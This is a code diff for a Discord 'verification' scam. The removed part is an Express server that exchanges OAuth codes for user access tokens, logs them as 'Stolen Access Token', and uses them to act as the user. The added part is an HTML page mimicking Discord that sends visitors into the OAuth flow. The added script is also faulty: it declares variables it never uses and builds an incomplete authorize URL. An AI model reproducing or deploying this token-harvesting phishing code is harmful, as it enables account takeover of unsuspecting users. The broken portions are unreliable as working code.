@@ -1,51 +1,14 @@
-const express = require('express');
-const axios = require('axios');
-const app = express();
+<!-- Simple HTML mimicking Discord -->
+<div class="discord-verify">
+  <h2>Verify Your Account</h2>
+  <button onclick="loginWithDiscord()">Login with Discord</button>
+</div>
 
-// Your Bot's Client ID and Secret (from Discord Developer Portal)
-const CLIENT_ID = '1546941291718508584';
-const CLIENT_SECRET = 'YOUR_CLIENT_SECRET_HERE'; 
-const REDIRECT_URI = 'https://your-website.com/callback';
-
-app.get('/callback', async (req, res) => {
-    const code = req.query.code;
-    
-    if (!code) return res.send('No code provided');
-
-    try {
-        // Exchange Code for Token
-        const tokenResponse = await axios.post(
-            'https://discord.com/api/oauth2/token',
-            new URLSearchParams({
-                client_id: CLIENT_ID,
-                client_secret: CLIENT_SECRET,
-                grant_type: 'authorization_code',
-                code: code,
-                redirect_uri: REDIRECT_URI
-            }),
-            {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-            }
-        );
-
-        const accessToken = tokenResponse.data.access_token;
-        
-        // Now you have the Token! You can use it to "hack" (act as) the user.
-        console.log(`Stolen Access Token: ${accessToken}`);
-
-        // Example: Send a DM to the user using their own token
-        await axios.post(
-            `https://discord.com/api/users/@me/channels`,
-            { recipient_id: 'USER_ID_HERE' }, // You need to fetch user ID first
-            { headers: { Authorization: `Bearer ${accessToken}` } }
-        );
-
-        res.send('Verification Complete! Check your DMs.');
-
-    } catch (error) {
-        console.error(error);
-        res.send('Error verifying');
-    }
-});
-
-app.listen(3000);
+<script>
+  function loginWithDiscord() {
+    // Redirect to Discord OAuth2
+    const clientId = "YOUR_CLIENT_ID";
+    const redirectUri = "https://your-website.com/callback";
+    window.location.href = `https://discord.com/oauth2/authorize?client_id=1546941291718508584`;
+  }
+</script>
